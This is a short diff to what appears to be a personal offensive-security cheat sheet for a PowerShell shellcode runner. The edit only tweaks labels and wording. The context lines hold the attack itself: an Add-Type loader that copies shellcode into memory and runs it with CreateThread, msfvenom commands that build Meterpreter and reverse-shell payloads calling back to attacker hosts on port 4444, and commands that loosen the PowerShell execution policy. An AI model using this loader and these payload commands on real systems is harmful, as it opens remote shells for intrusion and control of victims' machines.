@@ -40,7 +40,7 @@ $winFunc =
   Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
 
 [Byte[]];
-[Byte[]]$sc = <place your shellcode here>;
+[Byte[]]$sc = <place your shellcode here,no quotes here>;
 
 $size = 0x1000;
 
@@ -52,11 +52,11 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 
-shellcode: 
+ShellCode: 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell(shikata_ga_nai don't work here)
 
-powershell execution policy config:
+Powershell Execution Policy Config:
 Get-ExecutionPolicy -Scope CurrentUser
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
